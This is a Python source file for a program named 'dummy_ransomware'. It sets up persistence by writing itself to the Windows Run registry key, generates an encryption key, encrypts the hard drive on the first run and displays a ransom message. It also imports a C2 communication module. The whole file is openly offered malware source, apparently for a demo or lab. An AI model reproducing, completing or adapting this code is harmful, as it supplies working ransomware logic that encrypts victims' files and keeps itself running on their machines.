import winreg
import os
from gui_mgr import ShowMsg
from generate_key import GenerateKey
from encrypt_hd import EncryptHD
from c2_communication import C2Communication


def add_to_registry():
    """Persistence methods.
    Try to set a new value at the Run registry key.
    return True if success, otherwise, return False."""

    run_key = "Software\Microsoft\Windows\CurrentVersion\Run"
    new_value = "dummy_ransomware"
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key = winreg.OpenKey(reg, run_key, 0, winreg.KEY_ALL_ACCESS)
        winreg.QueryValueEx(key, new_value)

    except:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key,
                              winreg.KEY_SET_VALUE, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, new_value, 0, winreg.REG_SZ,
                           os.environ.get('USERPROFILE') + '\dummy_ransomware.py')
        key.Close()
        return True
    return False


def display_msg(encryption_mgr):
    """run the gui"""
    ShowMsg(encryption_mgr)


def main():
    """ransomware routine"""
    key_mgr = GenerateKey()
    key = key_mgr.generate_key()
    encryption_mgr = EncryptHD(key)
    # check if executed
    if add_to_registry():
        # encrypt the files
        encryption_mgr.encrypt_hd()
    display_msg(encryption_mgr)


if __name__ == '__main__':
    main()
